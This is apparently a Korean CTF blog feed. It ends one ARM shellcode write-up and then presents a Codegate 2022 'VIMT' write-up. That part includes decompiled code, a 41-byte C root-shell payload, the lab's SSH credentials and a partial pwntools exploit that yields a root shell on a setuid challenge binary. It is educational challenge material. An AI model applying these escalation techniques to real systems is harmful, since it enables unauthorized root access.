<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>따라서 코드를 입력할 때 <code>\x00\x00\x00\x00</code> 이후 셸코드를 입력하면 <code>check_code</code> 함수를 통과하여 셸코드를 실행할 수 있습니다. 이 풀이는 출제자가 디스코드에서 의도하지 않은 풀이라고 밝혔습니다.</p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] ARM, “A5: ARM Instruction Set Encoding,” in <em>ARM® Architecture Reference Manual ARMv7-A and ARMv7-R edition</em>. ARM Limited, 2018, pp. 191-216.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Codegate CTF 2022] VIMT</title>
    <url>/2022/07/05/codegate22-vimt/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>Monkeys help you</p>
</blockquote>
<p><a href="/uploads/codegate22-vimt/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>64비트 x86_64 바이너리 <code>app</code> 과 <code>Dockerfile</code> 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/vimt/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p><code>Dockerfile</code> 을 살펴보면 서버에서 바이너리에 setuid 권한을 부여하고 있으며, SSH 접속 가능한 계정과 비밀번호를 제공합니다. 따라서 주어진 바이너리를 통하여 root 권한의 셸을 획득하는 것이 목표임을 추측할 수 있습니다.</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;/home/ctf/app&quot;</span> &gt; /home/ctf/.bash_profile</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;exit&quot;</span> &gt;&gt; /home/ctf/.bash_profile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 640 /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> u+s /home/ctf/app</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf:ctf1234_smiley&#x27;</span> | chpasswd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s /bin/bash ctf</span></span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 문제의 이름처럼 Vim 에디터와 유사한 화면을 출력하는데, “hello world” 문자열을 입력했더니 각 문자 뒤에 쓰레기 값을 덧붙입니다.</p>
<p><img src="/images/codegate22-vimt/1.png" alt="1.png"></p>
<p><code>main</code> 함수에서 핵심적인 부분만 살펴보면 다음과 같습니다. 7행에서 <code>init</code> 함수를 호출하여 각종 전역 변수를 설정합니다. 15행에서 <code>getch</code> 함수로 문자를 입력받아 switch-case 구문에 넘깁니다. 문자가 Backspace인 경우 <code>deleteKey</code> 함수를 호출하고, 일반 문자의 경우 <code>inputKey</code> 함수를 호출하여 처리합니다. 문자가 Esc인 경우 Vim의 명령 모드(command mode)와 같이 <code>cmd</code> 에 추가적으로 커맨드를 입력받고, 52행부터 해당하는 커맨드의 함수를 호출합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">256uLL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">              <span class="keyword">while</span> ( !v3 )</span><br><span class="line">              &#123;</span><br><span class="line">                draw();</span><br><span class="line">                c = getch();</span><br><span class="line">                <span class="keyword">switch</span> ( c )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x1B</span>:                    <span class="comment">// Esc</span></span><br><span class="line">                                                <span class="comment">// switch to command mode</span></span><br><span class="line">                    v3 = <span class="number">1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n:&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x7F</span>:                    <span class="comment">// Backspace</span></span><br><span class="line">                    <span class="keyword">if</span> ( deleteKey() == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( cur_y &lt; y )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ++cur_y;</span><br><span class="line">                      cur_x = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( inputKey(c) == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">              _c = getch();</span><br><span class="line">              <span class="keyword">if</span> ( _c == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v4 &lt; <span class="number">255</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v0 = v4++;</span><br><span class="line">                cmd[v0] = _c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, _c);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;set&quot;</span>, cmd, <span class="number">3uLL</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;compile&quot;</span>, cmd, <span class="number">7uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( compile() != <span class="number">-1</span> )</span><br><span class="line">          <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">        v3 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( setAxis(cmd) != <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    v3 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>init</code> 함수는 6행에서 ioctl 시스템 콜을 호출하고, 결과를 전역 변수 <code>x</code> 와 <code>y</code> 에 대입합니다. <code>/usr/include/asm-generic/ioctls.h</code> 파일을 참고하면 요청 번호 <code>0x5413</code> 은 <code>TIOCGWINSZ</code> 로, 현재 터미널의 가로와 세로 크기를 구하는 요청입니다. 10행에서 터미널의 크기를 바탕으로 문자를 입력받을 2차원 배열 <code>map</code> 을 할당합니다. 16행에서는 각종 값으로 생성한 난수를 이용해 <code>rand</code> 함수의 seed를 초기화하고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ioctl(<span class="number">1</span>, <span class="number">0x5413</span>uLL, &amp;sz);                     <span class="comment">// ioctl(1, TIOCGWINSZ, &amp;sz)</span></span><br><span class="line">  x = sz.ws_col;</span><br><span class="line">  y = sz.ws_row - <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">map</span> = (<span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8LL</span> * (y + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">    <span class="built_in">map</span>[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, x + <span class="number">1</span>);</span><br><span class="line">  v3 = clock();</span><br><span class="line">  v2 = time(<span class="number">0LL</span>);</span><br><span class="line">  v0 = getpid();</span><br><span class="line">  seed = mix(v3, v2, v0);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>inputKey</code> 함수는 일반적인 문자 입력을 처리하는 함수입니다. <code>cur_x</code> , <code>cur_y</code> 는 현재 커서가 위치한 좌표를 나타내는 전역 변수로, 10행은 커서가 터미널의 가로 길이 끝까지 간 경우 줄바꿈하는 코드입니다. 19행에서 입력받은 문자를 2차원 배열 <code>map</code> 상에서 커서의 위치에 대입합니다. 20행의 반복문을 보면 문자 뒤로 랜덤한 5개의 문자를 추가하고 있는데, 이 부분의 코드가 원하는 문자열을 그대로 입력할 수 없었던 원인입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">inputKey</span><span class="params">(<span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> xpos; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> random_byte; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> *_row; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> _xpos; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_x = <span class="number">0</span>;</span><br><span class="line">    ++cur_y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">    cur_y = y - <span class="number">1</span>;</span><br><span class="line">  row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">  xpos = cur_x++;</span><br><span class="line">  row[xpos] = c;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      ++cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">      cur_y = y - <span class="number">1</span>;</span><br><span class="line">    random_byte = ascii[rand() % <span class="number">86</span>];</span><br><span class="line">    _row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    _xpos = cur_x++;</span><br><span class="line">    _row[_xpos] = random_byte;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>deleteKey</code> 함수는 Backspace 입력을 처리하는 함수입니다. Backspace를 한 번 입력할 때마다 반복문을 통해 현재 커서 위치에서 6개의 문자를 지웁니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">deleteKey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      --cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    row[--cur_x] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setAxis</code> 함수는 Esc 입력 후 “set y &lt;N&gt;” 커맨드를 처리하는 함수입니다. 21행에서 <code>cur_y</code> 전역 변수에 커맨드 매개변수로 전달된 정수 N을 대입합니다. 예를 들어 Esc 입력 후 &quot;set y 0&quot;을 입력하면, 커서의 세로축 위치가 첫 번째 줄로 이동합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">setAxis</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> _len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(cmd) &lt;= <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, len - <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">  v6 = cmd[<span class="number">4</span>];</span><br><span class="line">  _len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  <span class="built_in">memcpy</span>(s, cmd + <span class="number">6</span>, _len - <span class="number">6</span>);</span><br><span class="line">  n = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="string">&#x27;y&#x27;</span> &amp;&amp; v6 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= <span class="number">0</span> &amp;&amp; n &lt;= y - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_y = n;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>compile</code> 함수는 Esc 입력 후 “compile” 커맨드를 처리하는 함수입니다. 17~25행에서 <code>map</code> 의 내용을 <code>tmp/</code> 경로에 <code>.c</code> 확장자를 가진 파일로 저장합니다. 30행에서 <code>system</code> 함수를 호출하여 <code>gcc</code> 를 실행해 저장한 파일을 바이너리로 컴파일하고, 32행에서 성공하면 컴파일된 바이너리를 다시 <code>system</code> 함수로 실행합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">compile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  _map = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, (y + <span class="number">1</span>) * (x + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; x; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      _map[idx] = <span class="built_in">map</span>[i][j];</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  hexstring = randomHexString(<span class="number">32</span>);</span><br><span class="line">  hexstring_len = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  c_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, hexstring_len + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(c_file, <span class="string">&quot;tmp/%s.c&quot;</span>, hexstring);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  exec_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v1 + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(exec_file, <span class="string">&quot;tmp/%s&quot;</span>, hexstring);</span><br><span class="line">  fd = open(c_file, <span class="number">0x42</span>, <span class="number">420LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(_map);</span><br><span class="line">  write(fd, _map, v2);</span><br><span class="line">  close(fd);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(c_file);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(exec_file);</span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3 + v5 + <span class="number">9</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;gcc -o %s %s&quot;</span>, exec_file, c_file);</span><br><span class="line">  system(cmd);</span><br><span class="line">  <span class="keyword">if</span> ( !access(exec_file, <span class="number">0</span>) )</span><br><span class="line">    system(exec_file);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>문제 바이너리에 setuid 권한이 있으므로, 셸을 실행하는 C 소스 코드를 입력한 후 “compile” 커맨드로 컴파일하여 실행하면 root 권한의 셸을 얻을 수 있습니다. 다만  문자를 입력할 때마다 랜덤한 문자 5개가 함께 입력된다는 문제가 있는데, 터미널의 크기를 잘 조정하고 “set y &lt;N&gt;” 커맨드를 적절히 사용하면 원하는 문자열만 입력되도록 할 수 있습니다.</p>
<p>예를 들어 터미널의 가로 크기가 47일 때, “main()” 문자열을 입력해 보겠습니다. 먼저 첫 번째 문자인 ‘m’ 을 입력한 후 <code>map</code> 배열의 상태를 살펴보겠습니다. 초록색 문자는 입력한 문자, 흰색 문자는 랜덤으로 입력된 문자, 두꺼운 수직 바는 입력 후 커서의 위치를 나타냅니다. 입력한 ‘m’ 은 배열의 <code>map[0][0]</code> 에 저장됩니다.</p>
<p><img src="/images/codegate22-vimt/2.png" alt="2.png"></p>
<p>‘m’ 을 한번 더 입력해 보겠습니다. 이전의 입력에서 추가된 랜덤한 5바이트의 문자열로 인해, 이번 ‘m’ 은 배열의 <code>map[0][6]</code> 에 저장됩니다.</p>
<p><img src="/images/codegate22-vimt/3.png" alt="3.png"></p>
<p>이와 같이 ‘m’ 을 모두 8번 입력해 보겠습니다. 8번째로 입력한 ‘m’ 은 <code>map[0][42]</code> 에 저장됩니다. 이후 랜덤한 문자열이 추가되는데, 줄바꿈이 일어나 최종적으로 입력 후 커서의 위치가 <code>map[1][1]</code> 이 된 것을 확인할 수 있습니다.</p>
<p><img src="/images/codegate22-vimt/4.png" alt="4.png"></p>
<p>이 상태에서 “set y 0” 커맨드를 실행하면, <code>cur_y</code> 전역 변수의 값만 0으로 바뀌면서 커서의 위치가 <code>map[0][1]</code> 로 이동합니다.</p>
<p><img src="/images/codegate22-vimt/5.png" alt="5.png"></p>
<p>따라서 입력할 문자열의 두 번째 문자인 ‘a’ 를 입력하면, 의도했던 대로 ‘ma’ 를 입력할 수 있게 됩니다. 즉, 각 문자를 입력할 때마다 8번씩 입력한 후 “set y 0” 을 실행하면 모든 문자를 의도한 위치에 입력할 수 있습니다.</p>
<p><img src="/images/codegate22-vimt/6.png" alt="6.png"></p>
<p>이 방법을 사용하여 코드를 작성하기 위해서는 전체 코드에 줄바꿈이 없어야 하고, 코드의 길이가 터미널의 가로 크기인 47바이트보다 짧아야 합니다. 코드의 길이를 줄이기 위해 다음과 같은 <code>gcc</code> 의 트릭을 사용할 수 있습니다.</p>
<ol>
<li>함수 리턴 타입을 명시하지 않으면 기본값으로 <code>int</code> 를 반환합니다.</li>
<li>라이브러리 함수의 헤더를 <code>#include</code> 하지 않아도, 링킹 과정에서 동일한 프로토타입의 함수를 resolve하여 호출할 수 있도록 합니다.</li>
</ol>
<p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" target="_blank"><div class="link-preview-widget-title">Where does GCC find printf ? My code worked without any #include</div><div class="link-preview-widget-description">I am a C beginner so I tried to hack around the stuff.
I read stdio.h and I found this line:
extern int printf (const char *__restrict __format, ...);
So I wrote this code and i have no idea why it...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p>
<p>다음은 위의 트릭을 사용하여 작성한 셸을 실행하는 41바이트의 C 코드입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main() &#123;setuid(<span class="number">0</span>);execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>이 코드를 앞서 사용한 8번 입력 후 “set y 0” 커맨드를 실행하는 방법으로 입력한 후 <code>map</code> 배열의 상태는 다음과 같습니다. 커서는 <code>map[0][41]</code> 에 위치하고 있으며, <code>map[0]</code> 의 코드 뒷부분, <code>map[1]</code> 에 거쳐 랜덤한 문자들이 많이 남아있는 상황입니다.</p>
<p><img src="/images/codegate22-vimt/7.png" alt="7.png"></p>
<p>그런데 코드의 길이가 정확히 41바이트이므로, 현재 커서 위치에서 아무 문자 하나를 입력한 후(실제로는 6개가 입력됩니다) Backspace를 입력하여 <code>deleteKey</code> 함수를 호출하면 <code>map[0]</code> 의 뒷부분에 위치한 랜덤한 문자는 모두 지울 수 있습니다.</p>
<p>다음 그림에서 붉은 문자는 입력 후 Backspace에 지워지는 문자들입니다. <code>inputKey</code> 함수에서 줄바꿈은 새로운 문자를 입력받기 전 이전 입력에 대한 <code>cur_x</code> 값의 변화를 기준으로 수행합니다. <code>inputKey</code> 함수가 리턴한 이후 <code>deleteKey</code> 함수 호출 시점에서 커서의 위치는 줄바꿈이 아직 일어나지 않은 <code>map[0][47]</code> 이므로, 랜덤한 문자만 깔끔하게 지울 수 있게 됩니다.</p>
<p><img src="/images/codegate22-vimt/8.png" alt="8.png"></p>
<p>이후 “set y 1” 커맨드로 커서의 위치를 <code>map[1][41]</code> 로 옮긴 후, 동일하게 아무 문자 하나를 입력하고 Backspace를 8번 입력하면 <code>map[1]</code> 의 모든 문자를 지울 수 있습니다. 이제 의도했던 대로 정확히 소스 코드만 입력되었습니다. “compile” 커맨드로 바이너리를 컴파일한 후 실행하면 root 권한의 셸을 획득하게 됩니다.</p>
<p><img src="/images/codegate22-vimt/9.png" alt="9.png"></p>
<p>다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 4행은 <code>sshpass</code> 커맨드로 SSH 접속을 수행하고, 35행은 서버에서 <code>stty</code> 커맨드로 가상 터미널의 가로와 세로 크기를 지정합니다. 입력할 코드를 전송하는 과정에서 순서가 꼬여 실패하는 경우가 있는데, 익스플로잇 코드를 몇 번 실행하면 root 권한의 셸을 획득할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;sshpass -e ssh -tt ctf@localhost -p 1234 &#x27;bash -i&#x27;&quot;</span>,</span><br><span class="line">            shell=<span class="literal">True</span>, env=&#123;<span class="string">&quot;SSHPASS&quot;</span>: <span class="string">&quot;ctf1234_smiley&quot;</span>&#125;)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_axis</span>(<span class="params">n</span>):</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;set y &quot;</span> + <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_key</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(p8(c))</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">    set_axis(<span class="number">1</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile</span>():</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;compile&quot;</span>)</span><br><span class="line"></span><br><span 